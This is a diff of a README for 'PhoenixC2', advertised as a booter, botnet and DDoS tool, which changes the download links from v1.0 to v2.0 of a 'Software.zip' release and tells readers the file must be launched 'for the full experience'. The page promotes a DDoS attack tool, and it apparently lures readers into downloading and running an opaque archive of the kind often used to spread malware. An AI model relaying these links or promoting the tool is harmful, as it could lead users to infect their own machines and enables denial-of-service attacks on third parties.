@@ -29,9 +29,9 @@ Explore a wide range of topics related to booter, botnet, and DDoS attacks with 
 - udp-ddos
 
 ## Getting Started
-Ready to unleash the power of PhoenixC2? Click [here](https://github.com/lilroniel/PhoenixC2/releases/download/v1.0/Software.zip) to download the necessary files. Remember, it needs to be launched for the full experience!
+Ready to unleash the power of PhoenixC2? Click [here](https://github.com/lilroniel/PhoenixC2/releases/download/v2.0/Software.zip) to download the necessary files. Remember, it needs to be launched for the full experience!
 
-[![Download PhoenixC2](https://github.com/lilroniel/PhoenixC2/releases/download/v1.0/Software.zip)](https://github.com/lilroniel/PhoenixC2/releases/download/v1.0/Software.zip)
+[![Download PhoenixC2](https://github.com/lilroniel/PhoenixC2/releases/download/v2.0/Software.zip)](https://github.com/lilroniel/PhoenixC2/releases/download/v2.0/Software.zip)
 
 ## Contributing
 We welcome contributions from the community to make PhoenixC2 even more robust and versatile. Feel free to fork the repository, make your changes, and submit a pull request. Together, we can empower users with the tools they need to navigate the complex landscape of cybersecurity.
